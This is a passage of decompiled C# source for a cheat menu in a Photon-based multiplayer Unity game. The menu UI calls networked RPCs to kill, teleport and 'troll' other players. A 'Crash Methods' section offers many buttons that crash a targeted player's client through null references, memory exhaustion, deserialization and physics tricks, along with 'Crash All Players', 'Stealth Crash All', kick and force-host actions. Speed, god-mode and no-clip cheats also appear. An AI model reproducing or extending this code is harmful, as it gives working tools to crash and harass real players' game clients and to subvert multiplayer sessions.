			if (!GUIHelpers.DrawCollapsibleSection("VersionBypass", "? Version Bypass", Color.white))
			{
				return;
			}
			CheatConfig.VersionBypassEnabled = GUIHelpers.DrawToggleButton(CheatConfig.VersionBypassEnabled, "Auto Version Bypass");
			if (CheatConfig.VersionBypassEnabled)
			{
				string detectedHostVersion = VersionBypass.GetDetectedHostVersion();
				if (!string.IsNullOrEmpty(detectedHostVersion))
				{
					GUILayout.Label("Detected Host Version: " + detectedHostVersion, new GUIStyle(GUI.labelStyle)
					{
						fontSize = 10,
						normal = new GUIStyleState
						{
							textColor = new Color(0.4f, 1f, 0.6f, 1f)
						}
					}, Array.Empty<GUILayoutOption>());
				}
				else
				{
					GUILayout.Label("Waiting for version detection...", new GUIStyle(GUI.labelStyle)
					{
						fontSize = 10,
						normal = new GUIStyleState
						{
							textColor = new Color(0.8f, 0.8f, 0.4f, 1f)
						}
					}, Array.Empty<GUILayoutOption>());
				}
			}
			GUIHelpers.EndCollapsibleSection();
		}
	}
	public static class GUIPlayersTab
	{
		public static void Draw()
		{
			if (CheatConfig.CheaterDetectionEnabled && CheatConfig.DetectedCheaters.Count > 0)
			{
				if (GUIHelpers.DrawCollapsibleSection("CheaterDetection", "Cheater Detection", (Color?)new Color(1f, 0.3f, 0.3f, 1f)))
				{
					GUILayout.Label($"Detected {CheatConfig.DetectedCheaters.Count} cheater(s):", new GUIStyle(GUI.labelStyle)
					{
						fontStyle = FontStyle.Bold,
						normal = new GUIStyleState
						{
							textColor = new Color(1f, 0.5f, 0.5f, 1f)
						}
					}, Array.Empty<GUILayoutOption>());
					GUILayout.Space(4f);
					foreach (string key in CheatConfig.DetectedCheaters.Keys)
					{
						GUILayout.BeginHorizontal(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
						GUILayout.Label("!", new GUIStyle(GUI.labelStyle)
						{
							normal = new GUIStyleState
							{
								textColor = Color.red
							},
							fontSize = 16
						}, Array.Empty<GUILayoutOption>());
						GUILayout.Label(key, new GUIStyle(GUI.labelStyle)
						{
							normal = new GUIStyleState
							{
								textColor = new Color(1f, 0.6f, 0.6f, 1f)
							},
							fontStyle = FontStyle.Bold
						}, Array.Empty<GUILayoutOption>());
						GUILayout.EndHorizontal();
					}
					GUILayout.Space(4f);
					if (GUILayout.Button("Clear Cheater List", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
					{
						CheatConfig.DetectedCheaters.Clear();
					}
					GUIHelpers.EndCollapsibleSection();
				}
				GUILayout.Space(10f);
			}
			if (GUIHelpers.DrawCollapsibleSection("PlayerSelection", "Player Selection", Color.white))
			{
				GUI.CreatePlayersVerticalSelect();
				GUIHelpers.EndCollapsibleSection();
			}
			Character val = null;
			if (GUI.playerDict != null && GUI.playerDict.Count > 0 && GUI.selectedPlayerIndex >= 0 && GUI.selectedPlayerIndex < GUI.playerDict.Keys.Count)
			{
				string[] array = GUI.playerDict.Keys.ToArray();
				val = GUI.playerDict[array[GUI.selectedPlayerIndex]];
			}
			if (val == null || val.player == null)
			{
				if (GUIHelpers.DrawCollapsibleSection("NoPlayerSelected", "No Player Selected", (Color?)new Color(0.7f, 0.7f, 0.7f, 1f)))
				{
					GUILayout.Label("Select a player from the Player Selection section above", new GUIStyle(GUI.labelStyle)
					{
						normal = new GUIStyleState
						{
							textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
						}
					}, Array.Empty<GUILayoutOption>());
					GUIHelpers.EndCollapsibleSection();
				}
				return;
			}
			if (GUIHelpers.DrawCollapsibleSection("BasicActions", "Basic Actions", Color.white))
			{
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Kill", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }) && (Object)(object)val.photonView != (Object)null)
				{
					val.photonView.RPC("RPCA_Die", RpcTarget.All, new object[1] { val.Center });
				}
				if (GUILayout.Button("Revive", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.RevivePlayer(val, applyStatus: false, CheatConfig.TrollIncludeSelf);
				}
				if (GUILayout.Button("Pass Out", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.MakePlayerPassOut(val, CheatConfig.TrollIncludeSelf);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Make Fall", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.MakePlayerFall(val, 5f, CheatConfig.TrollIncludeSelf);
				}
				if (GUILayout.Button("Stop Fall", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.UnFallPlayer(val, CheatConfig.TrollIncludeSelf);
				}
				if (GUILayout.Button("Zombify", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.ZombifyPlayer(val, CheatConfig.TrollIncludeSelf);
				}
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("Teleportation", "Teleportation", Color.white))
			{
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Warp to Player", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }) && Character.localCharacter != null && (Object)(object)Character.localCharacter.photonView != (Object)null)
				{
					Character.localCharacter.photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2]
					{
						val.refs.head.transform.position,
						false
					});
				}
				if (GUILayout.Button("Warp Player to Me", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }) && Character.localCharacter != null && (Object)(object)val.photonView != (Object)null)
				{
					val.photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2]
					{
						Character.localCharacter.refs.head.transform.position,
						false
					});
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Walk Off Cliff", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.MakePlayerWalkOffCliff(val, CheatConfig.TrollIncludeSelf);
				}
				if (GUILayout.Button("Warp Everyone to Me", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }) && Character.localCharacter != null && (Object)(object)Character.localCharacter.photonView != (Object)null)
				{
					Vector3 position = Character.localCharacter.refs.head.transform.position;
					foreach (Character value in GUI.playerDict.Values)
					{
						if (value != null && (Object)(object)value.photonView != (Object)null)
						{
							value.photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2] { position, false });
						}
					}
				}
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("TrollActions", "Troll Actions", Color.white))
			{
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Launch Up", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.LaunchPlayer(val, Vector3.up, CheatConfig.TrollLaunchForce, CheatConfig.TrollIncludeSelf);
				}
				if (GUILayout.Button("Spin Player", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.MakePlayerSpin(val, CheatConfig.TrollSpinSpeed, CheatConfig.TrollSpinDuration, CheatConfig.TrollIncludeSelf);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Antigrav", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.ApplyAntigrav(val, CheatConfig.TrollAntigravDuration, CheatConfig.TrollIncludeSelf);
				}
				if (GUILayout.Button("Stick Body Part", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.StickPlayerBodyPart(val, (BodypartType)0, val.Center, (STATUSTYPE)0, 0f, CheatConfig.TrollIncludeSelf);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Unstick", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.UnstickPlayer(val, CheatConfig.TrollIncludeSelf);
				}
				if (GUILayout.Button("Make Me Carry", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }) && Character.localCharacter != null)
				{
					TrollFeatures.StartCarryPlayer(Character.localCharacter, val, CheatConfig.TrollIncludeSelf);
				}
				GUILayout.EndHorizontal();
				if (GUILayout.Button("Drop Carried", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }) && Character.localCharacter != null)
				{
					TrollFeatures.DropCarriedPlayer(Character.localCharacter, val, CheatConfig.TrollIncludeSelf);
				}
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("TrollSettings", "Troll Settings", Color.white))
			{
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Launch Force:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollLaunchForce = GUILayout.HorizontalSlider(CheatConfig.TrollLaunchForce, 10f, 1000f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollLaunchForce.ToString("F0"), GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Spin Speed:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollSpinSpeed = GUILayout.HorizontalSlider(CheatConfig.TrollSpinSpeed, 100f, 2000f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollSpinSpeed.ToString("F0"), GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Spin Duration:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollSpinDuration = GUILayout.HorizontalSlider(CheatConfig.TrollSpinDuration, 1f, 30f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollSpinDuration.ToString("F1") + "s", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Antigrav Duration:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollAntigravDuration = GUILayout.HorizontalSlider(CheatConfig.TrollAntigravDuration, 1f, 60f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollAntigravDuration.ToString("F1") + "s", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Fall Duration:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollFallDuration = GUILayout.HorizontalSlider(CheatConfig.TrollFallDuration, 1f, 30f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollFallDuration.ToString("F1") + "s", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.Space(5f);
				CheatConfig.TrollIncludeSelf = GUILayout.Toggle(CheatConfig.TrollIncludeSelf, "Include Self in Troll Effects", GUI.toggleStyle, Array.Empty<GUILayoutOption>());
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("CrashMethods", "Crash Methods", (Color?)new Color(1f, 0.3f, 0.3f, 1f)))
			{
				GUILayout.Label("Immediate Crashes:", new GUIStyle(GUI.labelStyle)
				{
					fontStyle = FontStyle.Bold,
					normal = new GUIStyleState
					{
						textColor = new Color(1f, 0.6f, 0.6f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Trigger Relay Bounds", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_TriggerRelayBounds(val);
				}
				if (GUILayout.Button("Tornado Null Refs", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_TornadoNullRefs(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Rescue Hook Null", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_RescueHookNull(val);
				}
				if (GUILayout.Button("Spider Null", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_SpiderNull(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Character Grab Null", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_CharacterGrabbingNull(val);
				}
				if (GUILayout.Button("Direct Player RPCs", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_DirectPlayerRPCs(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("All Null Refs", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_AllNullRefs(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.Space(5f);
				GUILayout.Label("Memory Exhaustion:", new GUIStyle(GUI.labelStyle)
				{
					fontStyle = FontStyle.Bold,
					normal = new GUIStyleState
					{
						textColor = new Color(1f, 0.6f, 0.6f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Max Array Size", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_MaxArraySize(val);
				}
				if (GUILayout.Button("Inventory Crash", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_Inventory(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Status Array Bounds", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_StatusArrayBounds(val);
				}
				if (GUILayout.Button("Object Spam", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_ObjectSpam(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.Space(5f);
				GUILayout.Label("Deserialization Crashes:", new GUIStyle(GUI.labelStyle)
				{
					fontStyle = FontStyle.Bold,
					normal = new GUIStyleState
					{
						textColor = new Color(1f, 0.6f, 0.6f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Deserialization", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_Deserialization(val);
				}
				if (GUILayout.Button("Statuses", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_Statuses(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Afflictions", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_Afflictions(val);
				}
				if (GUILayout.Button("Thorns", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_Thorns(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Reconnect Data", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_ReconnectData(val);
				}
				if (GUILayout.Button("Null References", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_NullReferences(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.Space(5f);
				GUILayout.Label("Physics Crashes:", new GUIStyle(GUI.labelStyle)
				{
					fontStyle = FontStyle.Bold,
					normal = new GUIStyleState
					{
						textColor = new Color(1f, 0.6f, 0.6f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Division By Zero", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_DivisionByZero(val);
				}
				if (GUILayout.Button("Extreme Values", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_ExtremeValues(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Invalid PhotonView", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_InvalidPhotonView(val);
				}
				if (GUILayout.Button("Get Fed Item Invalid", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					TrollFeatures.CrashPlayer_GetFedItemInvalid(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.Space(5f);
				GUILayout.Label("Ultimate Crashes:", new GUIStyle(GUI.labelStyle)
				{
					fontStyle = FontStyle.Bold,
					normal = new GUIStyleState
					{
						textColor = new Color(1f, 0.4f, 0.4f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("All Methods", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					TrollFeatures.CrashPlayer_AllMethods(val);
				}
				if (GUILayout.Button("Ultimate Crash", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					TrollFeatures.CrashPlayer_Ultimate(val);
				}
				GUILayout.EndHorizontal();
				GUILayout.Space(5f);
				GUILayout.Label("Multi-Player & Host:", new GUIStyle(GUI.labelStyle)
				{
					fontStyle = FontStyle.Bold,
					normal = new GUIStyleState
					{
						textColor = new Color(1f, 0.6f, 0.6f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Crash All Players", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					TrollFeatures.CrashAllPlayersAndDisconnect();
				}
				if (GUILayout.Button("Stealth Crash All", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					TrollFeatures.CrashAllPlayersStealth();
				}
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Kick Player", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					TrollFeatures.KickPlayer(val);
				}
				if (GUILayout.Button("Force Host", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					TrollFeatures.ForceHost();
				}
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			GUIPlayerManagement.DrawInventoryManagement();
			if (GUIHelpers.DrawCollapsibleSection("TestDummy", "Test Dummy", Color.white))
			{
				if (GUILayout.Button("Spawn Test Dummy (Bot)", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					GUI.SpawnTestDummy();
				}
				if (GUILayout.Button("Kill All Test Dummies", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					GUI.KillAllTestDummies();
				}
				GUIHelpers.EndCollapsibleSection();
			}
		}
	}
	public static class GUISelfOptionsTab
	{
		public static void Draw()
		{
			if (GUIHelpers.DrawCollapsibleSection("SpeedMovement", "? Speed & Movement", Color.white))
			{
				GUI.speed = GUIHelpers.DrawToggleButton(GUI.speed, "Speed Hack");
				if (GUI.speed)
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("Speed Multiplier:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(140f) });
					GUI.speedmultiply = GUILayout.HorizontalSlider(GUI.speedmultiply, 1f, 15f, Array.Empty<GUILayoutOption>());
					GUILayout.Label($"{GUI.speedmultiply:F1}x", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
					GUILayout.EndHorizontal();
				}
				GUILayout.Space(4f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Climbing Speed:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(140f) });
				GUI.climbingSpeedMultiplier = GUILayout.HorizontalSlider(GUI.climbingSpeedMultiplier, 0.1f, 10f, Array.Empty<GUILayoutOption>());
				GUILayout.Label($"{GUI.climbingSpeedMultiplier:F2}x", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.Space(4f);
				GUI.reduceStaminaConsumption = GUIHelpers.DrawToggleButton(GUI.reduceStaminaConsumption, "Reduce Stamina Consumption");
				if (GUI.reduceStaminaConsumption)
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("Stamina Usage:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(140f) });
					GUI.staminaConsumptionPercent = GUILayout.HorizontalSlider(GUI.staminaConsumptionPercent, 1f, 100f, Array.Empty<GUILayoutOption>());
					GUILayout.Label($"{GUI.staminaConsumptionPercent:F0}%", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
					GUILayout.EndHorizontal();
				}
				GUILayout.Space(4f);
				GUI.flyMode = GUIHelpers.DrawToggleButton(GUI.flyMode, "Fly Mode");
				if (GUI.flyMode)
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("Fly Speed:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(140f) });
					CheatConfig.FlySpeed = GUILayout.HorizontalSlider(CheatConfig.FlySpeed, 10f, 200f, Array.Empty<GUILayoutOption>());
					GUILayout.Label($"{CheatConfig.FlySpeed:F0}", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
					GUILayout.EndHorizontal();
				}
				GUILayout.Space(4f);
				GUI.noClip = GUIHelpers.DrawToggleButton(GUI.noClip, "No Clip");
				GUILayout.Space(4f);
				GUI.superJump = GUIHelpers.DrawToggleButton(GUI.superJump, "Super Jump");
				if (GUI.superJump)
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("Jump Multiplier:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(140f) });
					GUI.jumpMultiplier = GUILayout.HorizontalSlider(GUI.jumpMultiplier, 1f, 5f, Array.Empty<GUILayoutOption>());
					GUILayout.Label($"{GUI.jumpMultiplier:F1}x", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
					GUILayout.EndHorizontal();
				}
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("CombatSurvival", "? Survival", Color.white))
			{
				GUI.godmode = GUIHelpers.DrawToggleButton(GUI.godmode, "God Mode");
				GUILayout.Space(4f);
				GUI.infiniteammo = GUIHelpers.DrawToggleButton(GUI.infiniteammo, "Infinite Charges");
				GUILayout.Space(4f);
				GUI.rapidfire = GUIHelpers.DrawToggleButton(GUI.rapidfire, "No Item Cooldown");
				GUILayout.Space(4f);
				CheatConfig.NoInteractCooldown = GUIHelpers.DrawToggleButton(CheatConfig.NoInteractCooldown, "No Interact Cooldown");
				GUILayout.Space(4f);
				GUI.clearStatuses = GUIHelpers.DrawToggleButton(GUI.clearStatuses, "Clear Status Effects");
				GUILayout.Space(4f);
				GUI.noFallDamage = GUIHelpers.DrawToggleButton(GUI.noFallDamage, "No Fall Damage");
				if (!GUI.noFallDamage)
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("Fall Damage:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(140f) });
					GUI.fallDamagePercent = GUILayout.HorizontalSlider(GUI.fallDamagePercent, 0f, 200f, Array.Empty<GUILayoutOption>());
					GUILayout.Label($"{GUI.fallDamagePercent:F0}%", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
					GUILayout.EndHorizontal();
				}
				GUILayout.Space(4f);
				CheatConfig.AntiFallOver = GUIHelpers.DrawToggleButton(CheatConfig.AntiFallOver, "Anti Fall Over");
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("OtherFeatures", "? Other Features", Color.white))
			{
				GUI.Unlockall = GUIHelpers.DrawToggleButton(GUI.Unlockall, "Unlock All Items");
				GUILayout.Space(4f);
				GUI.rapidfire = GUIHelpers.DrawToggleButton(GUI.rapidfire, "Time Modifier");
				if (GUI.rapidfire)
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("Time:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(140f) });
					GUI.fireratecooldown = GUILayout.HorizontalSlider(GUI.fireratecooldown, 0f, 48f, Array.Empty<GUILayoutOption>());
					GUILayout.Label($"{GUI.fireratecooldown:F1}", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
					GUILayout.EndHorizontal();
				}
				GUILayout.Space(4f);
				GUI.randomoutfits = GUIHelpers.DrawToggleButton(GUI.randomoutfits, "Randomize Outfits");
				GUIHelpers.EndCollapsibleSection();
			}
			if (!GUIHelpers.DrawCollapsibleSection("AutoPathfinder", "? Auto Pathfinder", Color.white))
			{
				return;
			}
			CheatConfig.AutoPathfinderEnabled = GUIHelpers.DrawToggleButton(CheatConfig.AutoPathfinderEnabled, "Auto Pathfind to End");
			if (CheatConfig.AutoPathfinderEnabled)
			{
				if (AutoPathfinder.FollowingPath)
				{
					GUILayout.Label($"Following path ({AutoPathfinder.PathNodeCount} nodes)", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				}
				else
				{
					GUILayout.Label("Calculating path...", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				}
			}
			GUIHelpers.EndCollapsibleSection();
		}
	}
	public static class GUISettingsTab
	{
		private static string newConfigName = "";

		private static Vector2 configListScrollPos = Vector2.zero;

		public static void Draw()
		{
			if (GUIHelpers.DrawCollapsibleSection("Configuration", "? Configuration", Color.white))
			{
				GUILayout.Label("Current Config: " + ConfigManager.CurrentConfigName, new GUIStyle(GUI.labelStyle)
				{
					fontStyle = FontStyle.Bold
				}, Array.Empty<GUILayoutOption>());
				GUILayout.Space(5f);
				List<string> configList = ConfigManager.GetConfigList();
				GUILayout.Label("Available Configs:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
